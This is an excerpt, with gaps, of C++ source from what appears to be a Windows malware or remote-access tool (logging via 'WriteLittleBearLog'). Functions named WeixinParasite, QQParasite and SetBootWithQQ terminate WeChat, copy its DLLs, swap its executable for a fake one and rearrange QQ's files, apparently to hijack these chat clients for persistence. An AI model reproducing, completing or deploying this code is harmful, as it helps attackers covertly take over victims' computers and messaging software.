...
int __stdcall WeixinParasite() {
	...
	if (*szWechatPath)
	{
		...
		if (dwProcID)
		{
			ret = CloseProcessByName(szwxappname);
		}
		...
		ret = FileOperator::CheckFileExist(wxfakeexefn.c_str());
		if (ret == 0)
		{
			string wxexepth = string(szWechatPath) + "\\";
			char szdllname[MAX_DLL_COUNT][MAX_PATH];
			DWORD dllcnt = 0;
			ret = FindAndCopyFileIntoDstDir((char*)wxexepth.c_str(), strDataPath, szdllname, &dllcnt);
			...
			if (ret <= 0)
			{
				wsprintfA(szout, "replace file:%s with file:%s error:%u\r\n", dstexefullname.c_str(), wxfakeexefn, GetLastError());
				WriteLittleBearLog(szout);
			}
			else {
				wsprintfA(szout, "replace file:%s with file:%s ok\r\n", dstexefullname.c_str(), wxfakeexefn);
				WriteLittleBearLog(szout);
				return TRUE;
			}
		}
...
int __stdcall QQParasite(){
	...
	if (*strQQPath )
	{
		...
		ret = FileOperator::CheckFileExist(szCurrentDllPath.c_str());
		if (ret == FALSE)
		{
		...
		path.append("\\");
		ret = FileOperator::CheckPathExist(path);
		if (ret == FALSE)
		{
		...
		char szdllname[MAX_DLL_COUNT][MAX_PATH];
		DWORD dllcnt = 0;
		ret = FindAndCopyFileIntoDstDir((char*)path.c_str(),strDataPath,szdllname,&dllcnt);
...
int SetBootWithQQ(char *szAppPath,char * strDataPath,char * szDllName,char * szAppName)
{
	...
	if (FileOperator::CheckFileExist(string(szDllPath)) == FALSE)
	{
		return TRUE;
	}
	...
	if (FileOperator::CheckFileExist(string(szDllNewPath)))
	{
		moveOldFlag = 0;
	}else{
		moveOldFlag = TRUE;
